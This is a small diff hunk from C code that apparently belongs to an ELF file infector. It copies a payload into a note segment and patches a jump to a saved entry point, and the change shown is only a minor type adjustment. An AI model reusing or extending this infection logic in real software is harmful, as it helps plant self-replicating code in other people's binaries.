@@ -39,7 +39,7 @@ static void replicate_on_memory(const struct s_info *info, char *ptr)
 	for (size_t index = 0; index < PAYLOAD_SIZE; index++)
 		*dst++ = *src++;
 
-	_memcpy(ptr + info->note->p_offset + (JMP_OFFSET - sizeof(JMP_OPCODE)), &entry_point, sizeof(int32_t));
+	_memcpy(ptr + info->note->p_offset + (JMP_OFFSET - sizeof(JMP_OPCODE)), &entry_point, sizeof(int));
 }
 
 static void fuck_you(const struct s_info *info)
